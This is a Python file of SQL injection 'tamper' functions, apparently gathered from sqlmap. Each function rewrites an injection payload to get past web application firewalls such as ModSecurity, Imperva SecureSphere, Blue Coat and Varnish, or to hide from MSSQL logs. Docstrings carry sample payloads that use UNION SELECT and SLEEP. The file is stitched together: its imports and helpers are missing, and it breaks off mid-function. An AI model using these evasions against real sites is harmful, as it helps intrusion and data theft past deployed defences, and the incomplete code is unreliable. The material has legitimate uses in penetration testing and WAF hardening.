import re
def apostrophemask(payload, **kwargs):
    """
    Replaces apostrophe character with its UTF-8 full width counterpart
    References:
        * http://www.utf8-chartable.de/unicode-utf8-table.pl?start=65280&number=128
        * http://lukasz.pilorz.net/testy/unicode_conversion/
        * http://sla.ckers.org/forum/read.php?13,11562,11850
        * http://lukasz.pilorz.net/testy/full_width_utf/index.phps
    >>> tamper("1 AND '1'='1")
    '1 AND %EF%BC%871%EF%BC%87=%EF%BC%871'
    """
    return payload.replace('\'', "%EF%BC%87") if payload else payload



def apostrophenullencode(payload, **kwargs):
    """
    Replaces apostrophe character with its illegal double unicode counterpart

    >>> tamper("1 AND '1'='1")
    '1 AND %00%271%00%27=%00%271'
    """
    return payload.replace('\'', "%00%27") if payload else payload



def appendnullbyte(payload, **kwargs):
    """
    Appends encoded NULL byte character at the end of payload
    Requirement:
        * Microsoft Access
    Notes:
        * Useful to bypass weak web application firewalls when the back-end
          database management system is Microsoft Access - further uses are
          also possible
    Reference: http://projects.webappsec.org/w/page/13246949/Null-Byte-Injection
    >>> tamper('1 AND 1=1')
    '1 AND 1=1%00'
    """
    return "%s%%00" % payload if payload else payload



def base64encode(payload, **kwargs):
    """
    Base64 all characters in a given payload
    >>> tamper("1' AND SLEEP(5)#")
    'MScgQU5EIFNMRUVQKDUpIw=='
    """
    return base64.b64encode(payload.encode(UNICODE_ENCODING)) if payload else payload



def between(payload, **kwargs):
    """
    Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #'
    Replaces equals operator ('=') with 'BETWEEN # AND #'
    Tested against:
        * Microsoft SQL Server 2005
        * MySQL 4, 5.0 and 5.5
        * Oracle 10g
        * PostgreSQL 8.3, 8.4, 9.0
    Notes:
        * Useful to bypass weak and bespoke web application firewalls that
          filter the greater than character
        * The BETWEEN clause is SQL standard. Hence, this tamper script
          should work against all (?) databases
    >>> tamper('1 AND A > B--')
    '1 AND A NOT BETWEEN 0 AND B--'
    >>> tamper('1 AND A = B--')
    '1 AND A BETWEEN B AND B--'
    """
    retVal = payload
    if payload:
        match = re.search(r"(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^>]+?)\s*>\s*([^>]+)\s*\Z", payload)

        if match:
            _ = "%s %s NOT BETWEEN 0 AND %s" % (match.group(2), match.group(4), match.group(5))
            retVal = retVal.replace(match.group(0), _)
        else:
            retVal = re.sub(r"\s*>\s*(\d+|'[^']+'|\w+\(\d+\))", " NOT BETWEEN 0 AND \g<1>", payload)

        if retVal == payload:
            match = re.search(r"(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^=]+?)\s*=\s*(\w+)\s*", payload)

            if match:
                _ = "%s %s BETWEEN %s AND %s" % (match.group(2), match.group(4), match.group(5), match.group(5))
                retVal = retVal.replace(match.group(0), _)
    return retVal



def bluecoat(payload, **kwargs):
    """
    Replaces space character after SQL statement with a valid random blank character.
    Afterwards replace character = with LIKE operator
    Requirement:
        * Blue Coat SGOS with WAF activated as documented in
        https://kb.bluecoat.com/index?page=content&id=FAQ2147
    Tested against:
        * MySQL 5.1, SGOS
    Notes:
        * Useful to bypass Blue Coat's recommended WAF rule configuration

    >>> tamper('SELECT id FROM users WHERE id = 1')
    'SELECT%09id FROM%09users WHERE%09id LIKE 1'
    """
    def process(match):
        word = match.group('word')
        if word.upper() in kb.keywords:
            return match.group().replace(word, "%s%%09" % word)
        else:
            return match.group()
    retVal = payload
    if payload:
        retVal = re.sub(r"\b(?P<word>[A-Z_]+)(?=[^\w(]|\Z)", lambda match: process(match), retVal)
        retVal = re.sub(r"\s*=\s*", " LIKE ", retVal)
        retVal = retVal.replace("%09 ", "%09")
    return retVal



def chardoubleencode(payload, **kwargs):
    """
    Double url-encodes all characters in a given payload (not processing
    already encoded)
    Notes:
        * Useful to bypass some weak web application firewalls that do not
          double url-decode the request before processing it through their
          ruleset
    >>> tamper('SELECT FIELD FROM%20TABLE')
    '%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545'
    """
    retVal = payload
    if payload:
        retVal = ""
        i = 0
        while i < len(payload):
            if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:
                retVal += '%%25%s' % payload[i + 1:i + 3]
                i += 3
            else:
                retVal += '%%25%.2X' % ord(payload[i])
                i += 1
    return retVal



def charencode(payload, **kwargs):
    """
    Url-encodes all characters in a given payload (not processing already
    encoded)
    Tested against:
        * Microsoft SQL Server 2005
        * MySQL 4, 5.0 and 5.5
        * Oracle 10g
        * PostgreSQL 8.3, 8.4, 9.0
    Notes:
        * Useful to bypass very weak web application firewalls that do not
          url-decode the request before processing it through their ruleset
        * The web server will anyway pass the url-decoded version behind,
          hence it should work against any DBMS

    >>> tamper('SELECT FIELD FROM%20TABLE')
    '%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45'
    """
    retVal = payload
    if payload:
        retVal = ""
        i = 0
        while i < len(payload):
            if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:
                retVal += payload[i:i + 3]
                i += 3
            else:
                retVal += '%%%.2X' % ord(payload[i])
                i += 1
    return retVal




def charunicodeencode(payload, **kwargs):
    """
    Unicode-url-encodes non-encoded characters in a given payload (not
    processing already encoded)
    Requirement:
        * ASP
        * ASP.NET
    Tested against:
        * Microsoft SQL Server 2000
        * Microsoft SQL Server 2005
        * MySQL 5.1.56
        * PostgreSQL 9.0.3
    Notes:
        * Useful to bypass weak web application firewalls that do not
          unicode url-decode the request before processing it through their
          ruleset
    >>> tamper('SELECT FIELD%20FROM TABLE')
    '%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045'
    """
    retVal = payload

    if payload:
        retVal = ""
        i = 0
        while i < len(payload):
            if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:
                retVal += "%%u00%s" % payload[i + 1:i + 3]
                i += 3
            else:
                retVal += '%%u%.4X' % ord(payload[i])
                i += 1
    return retVal




def concat2concatws(payload, **kwargs):
    """
    Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'
    Requirement:
        * MySQL
    Tested against:
        * MySQL 5.0
    Notes:
        * Useful to bypass very weak and bespoke web application firewalls
          that filter the CONCAT() function
    >>> tamper('CONCAT(1,2)')
    'CONCAT_WS(MID(CHAR(0),0,0),1,2)'
    """
    if payload:
        payload = payload.replace("CONCAT(", "CONCAT_WS(MID(CHAR(0),0,0),")
    return payload



def equaltolike(payload, **kwargs):
    """
    Replaces all occurances of operator equal ('=') with operator 'LIKE'
    Tested against:
        * Microsoft SQL Server 2005
        * MySQL 4, 5.0 and 5.5
    Notes:
        * Useful to bypass weak and bespoke web application firewalls that
          filter the equal character ('=')
        * The LIKE operator is SQL standard. Hence, this tamper script
          should work against all (?) databases
    >>> tamper('SELECT * FROM users WHERE id=1')
    'SELECT * FROM users WHERE id LIKE 1'
    """
    def process(match):
        word = match.group()
        word = "%sLIKE%s" % (" " if word[0] != " " else "", " " if word[-1] != " " else "")

        return word
    retVal = payload
    if payload:
        retVal = re.sub(r"\s*=\s*", lambda match: process(match), retVal)
    return retVal



def greatest(payload, **kwargs):
    """
    Replaces greater than operator ('>') with 'GREATEST' counterpart

    Tested against:
        * MySQL 4, 5.0 and 5.5
        * Oracle 10g
        * PostgreSQL 8.3, 8.4, 9.0

    Notes:
        * Useful to bypass weak and bespoke web application firewalls that
          filter the greater than character
        * The GREATEST clause is a widespread SQL command. Hence, this
          tamper script should work against majority of databases

    >>> tamper('1 AND A > B')
    '1 AND GREATEST(A,B+1)=A'
    """

    retVal = payload

    if payload:
        match = re.search(r"(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^>]+?)\s*>\s*([^>#-]+)", payload)

        if match:
            _ = "%sGREATEST(%s,%s+1)=%s" % (match.group(1), match.group(4), match.group(5), match.group(4))
            retVal = retVal.replace(match.group(0), _)

    return retVal





def halfversionedmorekeywords(payload, **kwargs):
    """
    Adds versioned MySQL comment before each keyword

    Requirement:
        * MySQL < 5.1

    Tested against:
        * MySQL 4.0.18, 5.0.22

    Notes:
        * Useful to bypass several web application firewalls when the
          back-end database management system is MySQL
        * Used during the ModSecurity SQL injection challenge,
          http://modsecurity.org/demo/challenge.html

    >>> tamper("value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa")
    "value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa"
    """

    def process(match):
        word = match.group('word')
        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
            return match.group().replace(word, "/*!0%s" % word)
        else:
            return match.group()

    retVal = payload

    if payload:
        retVal = re.sub(r"(?<=\W)(?P<word>[A-Za-z_]+)(?=\W|\Z)", lambda match: process(match), retVal)
        retVal = retVal.replace(" /*!0", "/*!0")

    return retVal





def ifnull2ifisnull(payload, **kwargs):
    """
    Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)'

    Requirement:
        * MySQL
        * SQLite (possibly)
        * SAP MaxDB (possibly)

    Tested against:
        * MySQL 5.0 and 5.5

    Notes:
        * Useful to bypass very weak and bespoke web application firewalls
          that filter the IFNULL() function

    >>> tamper('IFNULL(1, 2)')
    'IF(ISNULL(1),2,1)'
    """

    if payload and payload.find("IFNULL") > -1:
        while payload.find("IFNULL(") > -1:
            index = payload.find("IFNULL(")
            depth = 1
            comma, end = None, None

            for i in xrange(index + len("IFNULL("), len(payload)):
                if depth == 1 and payload[i] == ',':
                    comma = i

                elif depth == 1 and payload[i] == ')':
                    end = i
                    break

                elif payload[i] == '(':
                    depth += 1

                elif payload[i] == ')':
                    depth -= 1

            if comma and end:
                _ = payload[index + len("IFNULL("):comma]
                __ = payload[comma + 1:end].lstrip()
                newVal = "IF(ISNULL(%s),%s,%s)" % (_, __, _)
                payload = payload[:index] + newVal + payload[end + 1:]
            else:
                break

    return payload




def informationschemacomment(payload, **kwargs):
    """
    Add a comment to the end of all occurrences of (blacklisted) "information_schema" identifier

    >>> tamper('SELECT table_name FROM INFORMATION_SCHEMA.TABLES')
    'SELECT table_name FROM INFORMATION_SCHEMA/**/.TABLES'
    """

    retVal = payload

    if payload:
        retVal = re.sub(r"(?i)(information_schema)\.", "\g<1>/**/.", payload)

    return retVal




def lowercase(payload, **kwargs):
    """
    Replaces each keyword character with lower case value

    Tested against:
        * Microsoft SQL Server 2005
        * MySQL 4, 5.0 and 5.5
        * Oracle 10g
        * PostgreSQL 8.3, 8.4, 9.0

    Notes:
        * Useful to bypass very weak and bespoke web application firewalls
          that has poorly written permissive regular expressions
        * This tamper script should work against all (?) databases

    >>> tamper('INSERT')
    'insert'
    """

    retVal = payload

    if payload:
        for match in re.finditer(r"[A-Za-z_]+", retVal):
            word = match.group()

            if word.upper() in kb.keywords:
                retVal = retVal.replace(word, word.lower())

    return retVal



def modsecurityversioned(payload, **kwargs):
    """
    Embraces complete query with versioned comment

    Requirement:
        * MySQL

    Tested against:
        * MySQL 5.0

    Notes:
        * Useful to bypass ModSecurity WAF/IDS

    >>> import random
    >>> random.seed(0)
    >>> tamper('1 AND 2>1--')
    '1 /*!30874AND 2>1*/--'
    """

    retVal = payload

    if payload:
        postfix = ''
        for comment in ('#', '--', '/*'):
            if comment in payload:
                postfix = payload[payload.find(comment):]
                payload = payload[:payload.find(comment)]
                break
        if ' ' in payload:
            retVal = "%s /*!30%s%s*/%s" % (payload[:payload.find(' ')], randomInt(3), payload[payload.find(' ') + 1:], postfix)

    return retVal




def modsecurityzeroversioned(payload, **kwargs):
    """
    Embraces complete query with zero-versioned comment

    Requirement:
        * MySQL

    Tested against:
        * MySQL 5.0

    Notes:
        * Useful to bypass ModSecurity WAF/IDS

    >>> tamper('1 AND 2>1--')
    '1 /*!00000AND 2>1*/--'
    """

    retVal = payload

    if payload:
        postfix = ''
        for comment in ('#', '--', '/*'):
            if comment in payload:
                postfix = payload[payload.find(comment):]
                payload = payload[:payload.find(comment)]
                break
        if ' ' in payload:
            retVal = "%s /*!00000%s*/%s" % (payload[:payload.find(' ')], payload[payload.find(' ') + 1:], postfix)

    return retVal




def multiplespaces(payload, **kwargs):
    """
    Adds multiple spaces around SQL keywords

    Notes:
        * Useful to bypass very weak and bespoke web application firewalls
          that has poorly written permissive regular expressions

    Reference: https://www.owasp.org/images/7/74/Advanced_SQL_Injection.ppt

    >>> random.seed(0)
    >>> tamper('1 UNION SELECT foobar')
    '1    UNION     SELECT   foobar'
    """

    retVal = payload

    if payload:
        words = set()

        for match in re.finditer(r"[A-Za-z_]+", payload):
            word = match.group()

            if word.upper() in kb.keywords:
                words.add(word)

        for word in words:
            retVal = re.sub("(?<=\W)%s(?=[^A-Za-z_(]|\Z)" % word, "%s%s%s" % (' ' * random.randrange(1, 4), word, ' ' * random.randrange(1, 4)), retVal)
            retVal = re.sub("(?<=\W)%s(?=[(])" % word, "%s%s" % (' ' * random.randrange(1, 4), word), retVal)

    return retVal




def nonrecursivereplacement(payload, **kwargs):
    """
    Replaces predefined SQL keywords with representations
    suitable for replacement (e.g. .replace("SELECT", "")) filters

    Notes:
        * Useful to bypass very weak custom filters

    >>> random.seed(0)
    >>> tamper('1 UNION SELECT 2--')
    '1 UNIOUNIONN SELESELECTCT 2--'
    """

    keywords = ("UNION", "SELECT", "INSERT", "UPDATE", "FROM", "WHERE")
    retVal = payload

    warnMsg = "currently only couple of keywords are being processed %s. " % str(keywords)
    warnMsg += "You can set it manually according to your needs"
    singleTimeWarnMessage(warnMsg)

    if payload:
        for keyword in keywords:
            _ = random.randint(1, len(keyword) - 1)
            retVal = re.sub(r"(?i)\b%s\b" % keyword, "%s%s%s" % (keyword[:_], keyword, keyword[_:]), retVal)

    return retVal




def overlongutf8(payload, **kwargs):
    """
    Converts all characters in a given payload (not processing already
    encoded)

    Reference: https://www.acunetix.com/vulnerabilities/unicode-transformation-issues/

    >>> tamper('SELECT FIELD FROM TABLE WHERE 2>1')
    'SELECT%C0%AAFIELD%C0%AAFROM%C0%AATABLE%C0%AAWHERE%C0%AA2%C0%BE1'
    """

    retVal = payload

    if payload:
        retVal = ""
        i = 0

        while i < len(payload):
            if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:
                retVal += payload[i:i + 3]
                i += 3
            else:
                if payload[i] not in (string.ascii_letters + string.digits):
                    retVal += "%%C0%%%.2X" % (0x8A | ord(payload[i]))
                else:
                    retVal += payload[i]
                i += 1

    return retVal




def percentage(payload, **kwargs):
    """
    Adds a percentage sign ('%') infront of each character

    Requirement:
        * ASP

    Tested against:
        * Microsoft SQL Server 2000, 2005
        * MySQL 5.1.56, 5.5.11
        * PostgreSQL 9.0

    Notes:
        * Useful to bypass weak and bespoke web application firewalls

    >>> tamper('SELECT FIELD FROM TABLE')
    '%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E'
    """

    if payload:
        retVal = ""
        i = 0

        while i < len(payload):
            if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:
                retVal += payload[i:i + 3]
                i += 3
            elif payload[i] != ' ':
                retVal += '%%%s' % payload[i]
                i += 1
            else:
                retVal += payload[i]
                i += 1

    return retVal




def randomcase(payload, **kwargs):
    """
    Replaces each keyword character with random case value

    Tested against:
        * Microsoft SQL Server 2005
        * MySQL 4, 5.0 and 5.5
        * Oracle 10g
        * PostgreSQL 8.3, 8.4, 9.0

    Notes:
        * Useful to bypass very weak and bespoke web application firewalls
          that has poorly written permissive regular expressions
        * This tamper script should work against all (?) databases

    >>> import random
    >>> random.seed(0)
    >>> tamper('INSERT')
    'INseRt'
    """

    retVal = payload

    if payload:
        for match in re.finditer(r"[A-Za-z_]+", retVal):
            word = match.group()

            if word.upper() in kb.keywords:
                while True:
                    _ = ""

                    for i in xrange(len(word)):
                        _ += word[i].upper() if randomRange(0, 1) else word[i].lower()

                    if len(_) > 1 and _ not in (_.lower(), _.upper()):
                        break

                retVal = retVal.replace(word, _)

    return retVal




def randomcomments(payload, **kwargs):
    """
    Add random comments to SQL keywords

    >>> import random
    >>> random.seed(0)
    >>> tamper('INSERT')
    'I/**/N/**/SERT'
    """

    retVal = payload

    if payload:
        for match in re.finditer(r"\b[A-Za-z_]+\b", payload):
            word = match.group()

            if len(word) < 2:
                continue

            if word.upper() in kb.keywords:
                _ = word[0]

                for i in xrange(1, len(word) - 1):
                    _ += "%s%s" % ("/**/" if randomRange(0, 1) else "", word[i])

                _ += word[-1]

                if "/**/" not in _:
                    index = randomRange(1, len(word) - 1)
                    _ = word[:index] + "/**/" + word[index:]

                retVal = retVal.replace(word, _)

    return retVal




def securesphere(payload, **kwargs):
    """
    Appends special crafted string

    Notes:
        * Useful for bypassing Imperva SecureSphere WAF
        * Reference: http://seclists.org/fulldisclosure/2011/May/163

    >>> tamper('1 AND 1=1')
    "1 AND 1=1 and '0having'='0having'"
    """

    return payload + " and '0having'='0having'" if payload else payload




def space2comment(payload, **kwargs):
    """
    Replaces space character (' ') with comments '/**/'

    Tested against:
        * Microsoft SQL Server 2005
        * MySQL 4, 5.0 and 5.5
        * Oracle 10g
        * PostgreSQL 8.3, 8.4, 9.0

    Notes:
        * Useful to bypass weak and bespoke web application firewalls

    >>> tamper('SELECT id FROM users')
    'SELECT/**/id/**/FROM/**/users'
    """

    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += "/**/"
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == " " and not doublequote and not quote:
                retVal += "/**/"
                continue

            retVal += payload[i]

    return retVal




def space2dash(payload, **kwargs):
    """
    Replaces space character (' ') with a dash comment ('--') followed by
    a random string and a new line ('\n')

    Requirement:
        * MSSQL
        * SQLite

    Notes:
        * Useful to bypass several web application firewalls
        * Used during the ZeroNights SQL injection challenge,
          https://proton.onsec.ru/contest/

    >>> random.seed(0)
    >>> tamper('1 AND 9227=9227')
    '1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227'
    """

    retVal = ""

    if payload:
        for i in xrange(len(payload)):
            if payload[i].isspace():
                randomStr = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))
                retVal += "--%s%%0A" % randomStr
            elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                retVal += payload[i:]
                break
            else:
                retVal += payload[i]

    return retVal




def space2hash(payload, **kwargs):
    """
    Replaces space character (' ') with a pound character ('#') followed by
    a random string and a new line ('\n')

    Requirement:
        * MySQL

    Tested against:
        * MySQL 4.0, 5.0

    Notes:
        * Useful to bypass several web application firewalls
        * Used during the ModSecurity SQL injection challenge,
          http://modsecurity.org/demo/challenge.html

    >>> random.seed(0)
    >>> tamper('1 AND 9227=9227')
    '1%23nVNaVoPYeva%0AAND%23ngNvzqu%0A9227=9227'
    """

    retVal = ""

    if payload:
        for i in xrange(len(payload)):
            if payload[i].isspace():
                randomStr = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))
                retVal += "%%23%s%%0A" % randomStr
            elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                retVal += payload[i:]
                break
            else:
                retVal += payload[i]

    return retVal




def space2morehash(payload, **kwargs):
    """
    Replaces space character (' ') with a pound character ('#') followed by
    a random string and a new line ('\n')

    Requirement:
        * MySQL >= 5.1.13

    Tested against:
        * MySQL 5.1.41

    Notes:
        * Useful to bypass several web application firewalls
        * Used during the ModSecurity SQL injection challenge,
          http://modsecurity.org/demo/challenge.html

    >>> random.seed(0)
    >>> tamper('1 AND 9227=9227')
    '1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227'
    """

    def process(match):
        word = match.group('word')
        randomStr = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))

        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
            return match.group().replace(word, "%s%%23%s%%0A" % (word, randomStr))
        else:
            return match.group()

    retVal = ""

    if payload:
        payload = re.sub(r"(?<=\W)(?P<word>[A-Za-z_]+)(?=\W|\Z)", lambda match: process(match), payload)

        for i in xrange(len(payload)):
            if payload[i].isspace():
                randomStr = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))
                retVal += "%%23%s%%0A" % randomStr
            elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                retVal += payload[i:]
                break
            else:
                retVal += payload[i]

    return retVal





def space2mssqlblank(payload, **kwargs):
    """
    Replaces space character (' ') with a random blank character from a
    valid set of alternate characters

    Requirement:
        * Microsoft SQL Server

    Tested against:
        * Microsoft SQL Server 2000
        * Microsoft SQL Server 2005

    Notes:
        * Useful to bypass several web application firewalls

    >>> random.seed(0)
    >>> tamper('SELECT id FROM users')
    'SELECT%0Eid%0DFROM%07users'
    """

    # ASCII table:
    #   SOH     01      start of heading
    #   STX     02      start of text
    #   ETX     03      end of text
    #   EOT     04      end of transmission
    #   ENQ     05      enquiry
    #   ACK     06      acknowledge
    #   BEL     07      bell
    #   BS      08      backspace
    #   TAB     09      horizontal tab
    #   LF      0A      new line
    #   VT      0B      vertical TAB
    #   FF      0C      new page
    #   CR      0D      carriage return
    #   SO      0E      shift out
    #   SI      0F      shift in
    blanks = ('%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0B', '%0C', '%0D', '%0E', '%0F', '%0A')
    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace, end = False, False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += random.choice(blanks)
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                end = True

            elif payload[i] == " " and not doublequote and not quote:
                if end:
                    retVal += random.choice(blanks[:-1])
                else:
                    retVal += random.choice(blanks)

                continue

            retVal += payload[i]

    return retVal




def space2mysqldash(payload, **kwargs):
    """
    Replaces space character (' ') with a dash comment ('--') followed by
    a new line ('\n')

    Requirement:
        * MySQL
        * MSSQL

    Tested against:

    Notes:
        * Useful to bypass several web application firewalls.

    >>> tamper('1 AND 9227=9227')
    '1--%0AAND--%0A9227=9227'
    """

    retVal = ""

    if payload:
        for i in xrange(len(payload)):
            if payload[i].isspace():
                retVal += "--%0A"
            elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                retVal += payload[i:]
                break
            else:
                retVal += payload[i]

    return retVal




def space2plus(payload, **kwargs):
    """
    Replaces space character (' ') with plus ('+')

    Notes:
        * Is this any useful? The plus get's url-encoded by sqlmap engine
          invalidating the query afterwards
        * This tamper script works against all databases

    >>> tamper('SELECT id FROM users')
    'SELECT+id+FROM+users'
    """

    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += "+"
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == " " and not doublequote and not quote:
                retVal += "+"
                continue

            retVal += payload[i]

    return retVal




def space2randomblank(payload, **kwargs):
    """
    Replaces space character (' ') with a random blank character from a
    valid set of alternate characters

    Tested against:
        * Microsoft SQL Server 2005
        * MySQL 4, 5.0 and 5.5
        * Oracle 10g
        * PostgreSQL 8.3, 8.4, 9.0

    Notes:
        * Useful to bypass several web application firewalls

    >>> random.seed(0)
    >>> tamper('SELECT id FROM users')
    'SELECT%0Did%0DFROM%0Ausers'
    """

    # ASCII table:
    #   TAB     09      horizontal TAB
    #   LF      0A      new line
    #   FF      0C      new page
    #   CR      0D      carriage return
    blanks = ("%09", "%0A", "%0C", "%0D")
    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += random.choice(blanks)
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == ' ' and not doublequote and not quote:
                retVal += random.choice(blanks)
                continue

            retVal += payload[i]

    return retVal




def sp_password(payload, **kwargs):
    """
    Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs

    Requirement:
        * MSSQL

    Notes:
        * Appending sp_password to the end of the query will hide it from T-SQL logs as a security measure
        * Reference: http://websec.ca/kb/sql_injection

    >>> tamper('1 AND 9227=9227-- ')
    '1 AND 9227=9227-- sp_password'
    """

    retVal = ""

    if payload:
        retVal = "%s%ssp_password" % (payload, "-- " if not any(_ if _ in payload else None for _ in ('#', "-- ")) else "")

    return retVal




def symboliclogical(payload, **kwargs):
    """
    Replaces AND and OR logical operators with their symbolic counterparts (&& and ||)

    >>> tamper("1 AND '1'='1")
    '1 && '1'='1'
    """

    retVal = payload

    if payload:
        retVal = re.sub(r"(?i)\bAND\b", "%26%26", re.sub(r"(?i)\bOR\b", "%7C%7C", payload))

    return retVal




def unionalltounion(payload, **kwargs):
    """
    Replaces UNION ALL SELECT with UNION SELECT

    >>> tamper('-1 UNION ALL SELECT')
    '-1 UNION SELECT'
    """

    return payload.replace("UNION ALL SELECT", "UNION SELECT") if payload else payload




def unmagicquotes(payload, **kwargs):
    """
    Replaces quote character (') with a multi-byte combo %bf%27 together with
    generic comment at the end (to make it work)

    Notes:
        * Useful for bypassing magic_quotes/addslashes feature

    Reference:
        * http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string

    >>> tamper("1' AND 1=1")
    '1%bf%27-- '
    """

    retVal = payload

    if payload:
        found = False
        retVal = ""

        for i in xrange(len(payload)):
            if payload[i] == '\'' and not found:
                retVal += "%bf%27"
                found = True
            else:
                retVal += payload[i]
                continue

        if found:
            _ = re.sub(r"(?i)\s*(AND|OR)[\s(]+([^\s]+)\s*(=|LIKE)\s*\2", "", retVal)
            if _ != retVal:
                retVal = _
                retVal += "-- "
            elif not any(_ in retVal for _ in ('#', '--', '/*')):
                retVal += "-- "
    return retVal




def varnish(payload, **kwargs):
    """
    Append a HTTP header 'X-originating-IP' to bypass
    WAF Protection of Varnish Firewall

    Notes:
        Reference: http://h30499.www3.hp.com/t5/Fortify-Application-Security/Bypassing-web-application-firewalls-using-HTTP-headers/ba-p/6418366

        Examples:
        >> X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)
        >> X-remote-IP: TARGET_PROXY_IP (184.189.250.X)
        >> X-originating-IP: TARGET_LOCAL_IP (127.0.0.1)
        >> x-remote-addr: TARGET_INTERNALUSER_IP (192.168.1.X)
        >> X-remote-IP: * or %00 or %0A
    """

    headers = kwargs.get("headers", {})
    headers["X-originating-IP"] = "127.0.0.1"
    return payload




def versionedkeywords(payload, **kwargs):
    """
    Encloses each non-function keyword with versioned MySQL comment

    Requirement:
        * MySQL

    Tested against:
        * MySQL 4.0.18, 5.1.56, 5.5.11

    Notes:
        * Useful to bypass several web application firewalls when the
          back-end database management system is MySQL

    >>> tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#')
    '1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#'
    """

    def process(match):
        word = match.group('word')
        if word.upper() in kb.keywords:
            return match.group().replace(word, "/*!%s*/" % word)
        else:
            return match.group()

    retVal = payload

    if payload:
        retVal = re.sub(r"(?<=\W)(?P<word>[A-Za-z_]+)(?=[^\w(]|\Z)", lambda match: process(match), retVal)
        retVal = retVal.replace(" /*!", "/*!").replace("*/ ", "*/")

    return retVal




def versionedmorekeywords(payload, **kwargs):
    """
    Encloses each keyword with versioned MySQL comment

    Requirement:
        * MySQL >= 5.1.13

    Tested against:
        * MySQL 5.1.56, 5.5.11

    Notes:
        * Useful to bypass several web application firewalls when the
          back-end database management system is MySQL

    >>> tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#')
    '1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#'
    """

    def process(match):
